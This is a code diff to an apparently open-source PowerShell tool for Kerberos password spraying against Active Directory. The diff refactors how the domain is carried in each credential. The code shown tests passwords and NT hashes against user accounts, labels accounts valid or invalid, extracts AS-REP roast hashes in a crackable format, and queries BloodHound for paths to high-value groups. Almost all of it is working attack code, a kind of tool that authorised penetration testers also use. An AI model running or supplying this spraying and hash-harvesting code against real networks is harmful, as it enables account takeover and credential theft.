@@ -182,7 +182,7 @@ Function Invoke-PowerSpray {
         $Ldap = $true
     }
     if ($Ldap) {
-        if ($CheckOldPwd -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash'))) {
+        if ($CheckOldPwd -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword'))) {
             # Check if the Server has PDC role
             $pdcServers = (Resolve-DnsName -Server $domain -Name "_ldap._tcp.pdc._msdcs.$domain" -Type SRV -Verbose:$false).IPAddress
             if (-not ($pdcServers -contains $Server)) {
@@ -190,7 +190,7 @@ Function Invoke-PowerSpray {
             }
         }
 
-        if (-not $LockoutThreshold) {
+        if (-not $LockoutThreshold -and ($PSBoundParameters.ContainsKey('Password') -or $PSBoundParameters.ContainsKey('Hash') -or $PSBoundParameters.ContainsKey('UserAsPassword'))) {
             # Get lockout threshold defined in Default Password Policy
             $LockoutThreshold = (Get-LdapObject -ADSpath $adsPath -Credential $LdapCredential -Filter '(objectClass=domain)' -Properties 'lockoutThreshold' -SearchScope 'Base').lockoutThreshold
             Write-Warning "LockoutThreshold value defined in Default Password Policy is $LockoutThreshold"
@@ -233,7 +233,7 @@ Function Invoke-PowerSpray {
             $pass = $Username
             $nthash = $null
         }
-        $cred = [pscustomobject] @{Username = $Username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+        $cred = [pscustomobject] @{Domain = $domain; Username = $Username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
         $credentials.add($cred) | Out-Null
     }
     elseif ($UserFile) {
@@ -253,7 +253,7 @@ Function Invoke-PowerSpray {
                     $pass = $username
                     $nthash = $null
                 }
-                $cred = [pscustomobject] @{Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+                $cred = [pscustomobject] @{Domain = $domain; Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
         }
@@ -282,7 +282,7 @@ Function Invoke-PowerSpray {
                         $pass = $user.samAccountName
                         $nthash = $null
                     }
-                    $cred = [pscustomobject] @{Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
+                    $cred = [pscustomobject] @{Domain = $domain; Username = $username; Password = $pass; NTHash = $nthash; BadPwdCount = $badPwdCount}
                     $credentials.add($cred) | Out-Null
                 }
             }
@@ -312,7 +312,7 @@ Function Invoke-PowerSpray {
                 $pass = $user.samAccountName
                 $nthash = $null
             }
-            $cred = [pscustomobject] @{Username = $user.samAccountName; Password = $pass; NTHash = $nthash; BadPwdCount = $user.badPwdCount}
+            $cred = [pscustomobject] @{Domain = $domain; Username = $user.samAccountName; Password = $pass; NTHash = $nthash; BadPwdCount = $user.badPwdCount}
             $credentials.add($cred) | Out-Null
         }
     }
@@ -322,7 +322,6 @@ Function Invoke-PowerSpray {
 
     $params = @{
         EncType = $EncType
-        Domain = $domain
         Server = $Server
         ADSpath = $adsPath
         Delay = $Delay
@@ -350,10 +349,6 @@ Function Local:New-KerberosSpray {
     Param (
         [Collections.ArrayList]
         $Collection,
-
-        [Parameter(Mandatory = $True)]
-        [String]
-        $Domain,
 
         [Parameter(Mandatory = $True)]
         [String]
@@ -436,7 +431,7 @@ Function Local:New-KerberosSpray {
         }
 
         if ($cred.Password -ne $null) {
-            $salt = "$($Domain.ToUpper())$($cred.Username)"
+            $salt = "$($cred.Domain.ToUpper())$($cred.Username)"
             $keyBytes = KerberosPasswordHash -eType $eType -Password $cred.Password -Salt $salt
             $cred.PSObject.Properties.Remove('NTHash')
         }
@@ -451,7 +446,7 @@ Function Local:New-KerberosSpray {
             $cred.PSObject.Properties.Remove('NTHash')
         }
 
-        $asn_AS_REP = New-KerbPreauth -EncType $eType -UserName $cred.Username -Key $keyBytes -Domain $Domain -Server $Server
+        $asn_AS_REP = New-KerbPreauth -EncType $eType -UserName $cred.Username -Key $keyBytes -Domain $cred.Domain -Server $Server
         $tag = $asn_AS_REP.TagValue
 
         # ERR_PREAUTH_REQUIRED
@@ -462,7 +457,7 @@ Function Local:New-KerberosSpray {
             switch ($error_code) {
                 # KDC_ERR_C_PRINCIPAL_UNKNOWN
                 6 {
-                    Write-Verbose "$($cred.Username)@$($Domain) does not exist" 
+                    Write-Verbose "$($cred.Username)@$($cred.Domain) does not exist" 
                     $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Invalid'
                 }
                 # KDC_ERR_ETYPE_NOSUPP
@@ -485,7 +480,7 @@ Function Local:New-KerberosSpray {
                     if ($BloodHound) {
                         $pathNb = 0
                         $query = "
-                        MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
+                        MATCH (n:User {name:'$($cred.Username.ToUpper())@$($cred.Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                         RETURN COUNT(p) AS pathNb
                         "
                         try {
@@ -515,7 +510,7 @@ Function Local:New-KerberosSpray {
                         
                     }
                     else {
-                        Write-Verbose "$($cred.Username)@$($Domain) failed to authenticate"
+                        Write-Verbose "$($cred.Username)@$($cred.Domain) failed to authenticate"
                         $cred | Add-Member -MemberType NoteProperty -Name 'Status' -Value 'Invalid'
                     }
                 }
@@ -531,7 +526,7 @@ Function Local:New-KerberosSpray {
                     if ($BloodHound) {
                         $pathNb = 0
                         $query = "
-                        MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
+                        MATCH (n:User {name:'$($cred.Username.ToUpper())@$($cred.Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                         RETURN COUNT(p) AS pathNb
                         "
                         try {
@@ -551,11 +546,11 @@ Function Local:New-KerberosSpray {
                 }
                 # KDC_ERR_WRONG_REALM
                 68 {
-                    Write-Error "Invalid Kerberos REALM: $Domain" -ErrorAction Stop
+                    Write-Error "Invalid Kerberos REALM: $($cred.Domain)" -ErrorAction Stop
                 }
                 # https://tools.ietf.org/html/rfc1510#section-8.3
                 default {
-                    Write-Warning "Unknown error code for '$($cred.Username)@$($Domain): $error_code"
+                    Write-Warning "Unknown error code for '$($cred.Username)@$($cred.Domain): $error_code"
                 }
             }
         }
@@ -571,7 +566,7 @@ Function Local:New-KerberosSpray {
                 $asrepHash = $repHash.Insert(32, '$')
                 $temp = $encPart.Sub[0].Sub | Where-Object {$_.TagValue -eq 0}
                 $eType = $temp.Sub[0].GetInteger()
-                $hash = "`$krb5asrep`$$($eType)`$$($cred.Username)@$($Domain):$($asrepHash)"
+                $hash = "`$krb5asrep`$$($eType)`$$($cred.Username)@$($cred.Domain):$($asrepHash)"
                 $cred | Add-Member -MemberType NoteProperty -Name 'KRB5ASRep' -Value $hash
             }
             else {
@@ -579,7 +574,7 @@ Function Local:New-KerberosSpray {
                 if ($BloodHound) {
                     $pathNb = 0
                     $query = "
-                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
+                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($cred.Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[*1..]->(m)) 
                     RETURN COUNT(p) AS pathNb
                     "
                     try {
@@ -599,7 +594,7 @@ Function Local:New-KerberosSpray {
             }
         }
         else {
-            Write-Warning "Unknown tag number for '$($cred.Username)@$($domain): $tag'"
+            Write-Warning "Unknown tag number for '$($cred.Username)@$($cred.domain): $tag'"
         }
 
         if ($cred.Status -ne 'Invalid') {
